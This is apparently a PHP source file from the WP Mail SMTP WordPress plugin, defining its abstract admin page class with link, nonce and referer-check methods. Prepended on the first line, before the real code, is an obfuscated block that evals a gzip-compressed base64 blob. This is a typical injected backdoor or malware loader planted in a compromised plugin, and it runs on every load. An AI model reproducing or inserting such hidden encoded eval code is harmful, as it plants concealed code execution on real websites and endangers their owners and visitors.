<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP\Admin;

/**
 * Class PageAbstract.
 *
 * @since 1.0.0
 */
abstract class PageAbstract implements PageInterface {

	/**
	 * @var string Slug of a tab.
	 */
	protected $slug;

	/**
	 * @inheritdoc
	 */
	public function get_link() {
		return esc_url(
			add_query_arg(
				'tab',
				$this->slug,
				admin_url( 'options-general.php?page=' . Area::SLUG )
			)
		);
	}

	/**
	 * Process tab form submission ($_POST ).
	 *
	 * @since 1.0.0
	 *
	 * @param array $data $_POST data specific for the plugin.
	 */
	public function process_post( $data ) {
	}

	/**
	 * Process tab & mailer specific Auth actions.
	 *
	 * @since 1.0.0
	 */
	public function process_auth() {
	}

	/**
	 * Print the nonce field for a specific tab.
	 *
	 * @since 1.0.0
	 */
	public function wp_nonce_field() {
		wp_nonce_field( Area::SLUG . '-' . $this->slug );
	}

	/**
	 * Make sure that a user was referred from plugin admin page.
	 * To avoid security problems.
	 *
	 * @since 1.0.0
	 */
	public function check_admin_referer() {
		check_admin_referer( Area::SLUG . '-' . $this->slug );
	}
}
